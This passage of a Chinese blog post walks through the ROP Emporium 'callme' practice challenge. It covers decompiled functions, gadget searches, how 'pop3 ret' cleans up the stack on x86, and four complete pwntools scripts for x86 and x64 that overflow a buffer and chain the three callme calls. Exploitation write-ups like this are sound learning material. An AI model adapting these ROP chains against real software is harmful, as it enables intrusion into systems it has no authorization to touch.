class="number">0x17ce</span>) + <span class="number">0x18</span>) ^ <span class="number">0xd00df00d</span>;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(*(unaff_EBX + <span class="number">0x17ce</span>));</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x210</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据反编译得到的伪码，可以大致推断出这三个函数的功能</p>
+<p><code>callme_one</code>：读取加密的flag；<code>callme_two</code>：解密0-15，前16个字节；<code>callme_three</code>：解密16-31，后16个字节。</p>
+<p>通过<code>xxd</code>也可以看到加密后的flag确实是32字节</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">xxd encrypted_flag.dat</span> </span><br><span class="line">00000000: 534d 5341 91d9 f5a6 8ad5 c5b7 dbdb 9dbe  SMSA............</span><br><span class="line">00000010: cada b2ed 2a84 63bc 71b5 70a0 7c79 3e5d  ....*.c.q.p.|y&gt;]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>查看<code>pwnme</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x08048570</span>]&gt; s sym.pwnme</span><br><span class="line">[<span class="number">0x080486ed</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x804886b</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显可以看到<code>read</code>函数处存在栈溢出，偏移量计算得为44。</p>
+<p>我还在看下<code>usefulFunction</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x080486ed</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x0804874f</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> iVar1;</span><br><span class="line">    uint uVar2;</span><br><span class="line">    uint uVar3;</span><br><span class="line">    uint uStack16;</span><br><span class="line">    </span><br><span class="line">    sym.imp.callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    sym.imp.callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    uVar3 = <span class="number">6</span>;</span><br><span class="line">    uVar2 = <span class="number">5</span>;</span><br><span class="line">    sym.imp.callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    sym.__x86.get_pc_thunk.bx();</span><br><span class="line">    sym._init();</span><br><span class="line">    iVar1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        (**(unaff_EBX + <span class="number">0x1753</span> + iVar1 * <span class="number">4</span>))(uVar2, uVar3, uStack16);</span><br><span class="line">        iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (iVar1 != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到函数内部调用了<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code>这三个函数，但是它的调用顺序跟提示的顺序刚好反过来了，所以，并不能直接覆盖返回地址到<code>usefulFunction</code>函数，看起来也不是那么的useful，还是需要我们手动构建ROP链。</p>
+<p>需要注意的是，在32位环境下，多次调用libc里的带有多个参数的函数，我们需要使用<code>pop3 ret</code>方法。</p>
+<p>举个栗子！</p>
+<p>假设我们要连续调用<code>read(fd1,buf1,size1)</code>和<code>write(fd2,buf2,size2)</code>两个函数调用，就不能按照平常的方式布置ROP，即直接将<code>write</code>函数的地址覆盖到预留返回地址处，这样的话，两个函数的参数会发生重叠，如图所示：</p>
+<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pwn%E5%AD%A6%E4%B9%A0.drawio.png" alt="pwn学习.drawio"></p>
+<p>所以我们要通过能够移动<code>esp</code>指针的gadgets来消除<code>read</code>函数的参数，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">add esp 8 ; pop ebx ; ret</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+
+<p>我们把上述描述的类似第一行的3个<code>pop</code>指令的gadgets统称为<code>pop3 ret</code>，即移动<code>esp</code>指针消去三个参数，再返回执行后续的函数，如图所示：</p>
+<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pop3ret.png" alt="pop3ret"></p>
+<p>通过上图所示的ROP布局，我们就能实现连续调用<code>read</code>和<code>write</code>函数，<code>pop3 ret</code>可以在<code>read/write</code>函数返回时，清理栈上的参数，进而触发下一次调用。</p>
+<blockquote>
+<p>2个参数的libc函数可以使用<code>pop2 ret</code></p>
+<p>1个参数的libc函数可以使用<code>pop ret</code></p>
+</blockquote>
+<p>更多具体内容参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/kelxLZ/article/details/111830630?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-111830630-blog-122399319.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-111830630-blog-122399319.pc_relevant_recovery_v2&utm_relevant_index=4">这篇博客</a>。</p>
+<p>再回到我们这道题中，我们需要连续三次调用<code>callme_one</code>，<code>callme_two</code> <code>callme_three</code>这三个函数，每个函数都有三个参数，所以我们需要找到<code>pop3 ret</code>这种类型的gadgets</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary callme32 --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080487fb : pop ebp ; ret</span><br><span class="line">0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484ad : pop ebx ; ret</span><br><span class="line">0x080487fa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048496 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>
+
+<p>可以看到地址<code>0x080487f9</code>处的gadgets满足要求。其实也可以使用<code>add esp</code>这种类型的gadgets，只要能够移动<code>esp</code>指针消去栈上的参数都可以。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">rop --grep <span class="string">&quot;add esp&quot;</span></span></span><br><span class="line">0x080484a8 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x080485f2 : add esp, 0x10 ; leave ; ret</span><br><span class="line">0x08048749 : add esp, 0x10 ; nop ; leave ; ret</span><br><span class="line">0x080487f5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484aa : add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x080487f3 : jne 0x80487e1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485ed : mov al, byte ptr [0xd0ff0804] ; add esp, 0x10 ; leave ; ret</span><br><span class="line">0x0804863a : mov al, byte ptr [0xd2ff0804] ; add esp, 0x10 ; leave ; ret</span><br><span class="line">0x080484a6 : mov dh, 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x08048810 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>0x080484aa</code>地址处的gadgets也能移动<code>esp</code>指针，并且刚好消去三个参数。</p>
+<p>完整的exploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p32(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p32(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p32(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">arg1 = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">arg2 = p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">arg3 = p32(<span class="number">0xd00df00d</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">add_esp = p32(<span class="number">0x080484aa</span>)<span class="comment"># add esp, 8 ; pop ebx ; ret </span></span><br><span class="line"><span class="comment">#stack balance ; clear three args of call_x function</span></span><br><span class="line">add_esp = p32(<span class="number">0x080487f9</span>)<span class="comment"># pop3 ret: pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= callme_one</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= arg1+arg2+arg3</span><br><span class="line">payload+= callme_two</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= arg1+arg2+arg3</span><br><span class="line">payload+= callme_three</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= arg1+arg2+arg3</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下：</p>
+<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313201914238.png" alt="image-20230313201914238"></p>
+<h3 id="解法2：构造二次溢出"><a href="#解法2：构造二次溢出" class="headerlink" title="解法2：构造二次溢出"></a>解法2：构造二次溢出</h3><p>这个解法是当时没搞明白怎么连续调用libc函数的时候想的办法，既然一次不能调用多个函数，那就进行多次调用，每次调用一个函数。</p>
+<p>思路：在预留返回地址处，将其覆盖为存在缓冲区漏洞的<code>pwnme</code>函数的地址，这样等到程序返回时会再次执行<code>pwnme</code>函数，我们再重新发送一次payload来调用其余的函数，重复直到三个<code>callme</code>函数全部调用完。</p>
+<p>完整的expploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p32(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p32(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p32(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">arg1 = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">arg2 = p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">arg3 = p32(<span class="number">0xd00df00d</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pwnme_addr)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_one + pwnme_addr + arg1 + arg2 + arg3 </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_two + pwnme_addr + arg1 +arg2 +arg3 </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + callme_three + p32(<span class="number">1</span>) + arg1 +arg2 +arg3 </span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下：</p>
+<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313202037300.png" alt="image-20230313202037300"></p>
+<p><strong>注意：</strong>这种构造二次溢出的方法，并不是通解，有时会受到一些限制，比如会漏掉一些堆栈平衡的操作导致偏移量变化。要根据实际情况来使用，可以当作一种拓展思路。</p>
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位道理相同，但是由于参数传递方式发生变化，前6个参数通过寄存器传递，消去参数比较容易理解，即调用<code>pop3 ret</code>重新给寄存器赋值，覆盖掉上边的值就可。</p>
+<p>完整的exploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">callme_one = p64(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p64(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p64(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx_ret = p64(<span class="number">0x000000000040093c</span>)</span><br><span class="line"></span><br><span class="line">arg1 = p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">arg2 = p64(<span class="number">0xcafebabecafebabe</span>)</span><br><span class="line">arg3 = p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_one</span><br><span class="line"></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_two</span><br><span class="line"></span><br><span class="line">payload+= pop_rdi_rsi_rdx_ret</span><br><span class="line">payload+= arg1 + arg2 + arg3</span><br><span class="line">payload+= callme_three</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解法2：构造二次溢出-1"><a href="#解法2：构造二次溢出-1" class="headerlink" title="解法2：构造二次溢出"></a>解法2：构造二次溢出</h3><p>同样，也可以通过构造二次溢出的方法解决</p>
+<p>完整的exploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p64(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p64(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p64(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p64(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx_ret = p64(<span class="number">0x000000000040093c</span>)</span><br><span class="line"></span><br><span class="line">arg1 = p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">arg2 = p64(<span class="number">0xcafebabecafebabe</span>)</span><br><span class="line">arg3 = p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_one + pwnme_addr  </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_two + pwnme_addr </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + pop_rdi_rsi_rdx_ret + arg1 + arg2 + arg3 + callme_three + pwnme_addr  </span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/15/ROP_Emporium/Challenge2_split/" rel="prev" title="Challenge2_split">
+      <i class="fa fa-chevron-left"></i> Challenge2_split
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/15/ROP_Emporium/Challenge4-write4/" rel="next" title="Challenge4_write4">
+      Challenge4_write4 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#callme"><span class="nav-number">1.</span> <span class="nav-text">callme</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x86"><span class="nav-number">1.1.</span> <span class="nav-text">x86</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A%E6%9E%84%E9%80%A0%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="nav-number">1.1.1.</span> <span class="nav-text">解法2：构造二次溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64"><span class="nav-number">1.2.</span> <span class="nav-text">x64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A%E6%9E%84%E9%80%A0%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">解法2：构造二次溢出</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="郭小白QAQ"
+      src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+  <p class="site-author-name" itemprop="name">郭小白QAQ</p>
+  <div class="site-description" itemprop="description">精彩不亮丽，起落是无常</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/guoxb0_0@qq.com" title="E-Mail → guoxb0_0@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">郭小白QAQ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">105k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:21</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
